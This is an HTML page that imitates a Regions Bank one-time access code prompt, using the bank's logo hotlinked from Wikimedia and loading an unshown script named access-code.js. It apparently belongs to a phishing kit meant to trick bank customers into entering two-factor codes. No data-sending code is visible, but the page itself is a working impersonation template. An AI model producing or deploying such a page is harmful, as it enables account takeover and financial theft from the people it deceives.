<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Access Code</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f4f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        .logo { display: block; margin: 0 auto 20px; width: 150px; }
        label { display: block; margin-bottom: 10px; font-weight: bold; font-size: 18px; }
        p { font-size: 14px; color: #555; }
        input[type="text"] { width: 80%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; text-align: center; font-size: 18px; }
        .btn-submit { width: 85%; background-color: #0077c8; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .btn-submit:hover { background-color: #005a9a; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Regions_Bank_logo.svg/2560px-Regions_Bank_logo.svg.png" alt="Regions Bank Logo" class="logo">
        <form id="accessCodeForm">
            <label for="accessCode">Enter Your Access Code</label>
            <p>For your security, we've sent a one-time access code to your registered device.</p>
            <input type="text" id="accessCode" required>
            <button type="submit" class="btn-submit">Submit</button>
        </form>
    </div>
    <script src="access-code.js"></script>
</body>
</html>
